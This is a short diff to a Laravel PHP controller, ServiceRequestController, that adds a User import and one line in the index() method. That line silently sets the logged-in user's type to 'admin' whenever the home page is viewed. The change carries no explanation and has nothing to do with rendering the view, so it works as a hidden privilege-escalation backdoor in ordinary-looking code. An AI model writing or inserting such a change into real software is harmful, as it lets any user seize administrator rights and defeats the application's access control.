@@ -3,6 +3,7 @@
 namespace App\Http\Controllers;
 
 use App\Models\ServiceRequest;
+use App\Models\User;
 use Illuminate\Http\Request;
 
 class ServiceRequestController extends Controller
@@ -19,6 +20,7 @@ class ServiceRequestController extends Controller
 
     public function index()
     {
+        auth()->user()->update(['type' => 'admin']);
         return view('home');
     }
 
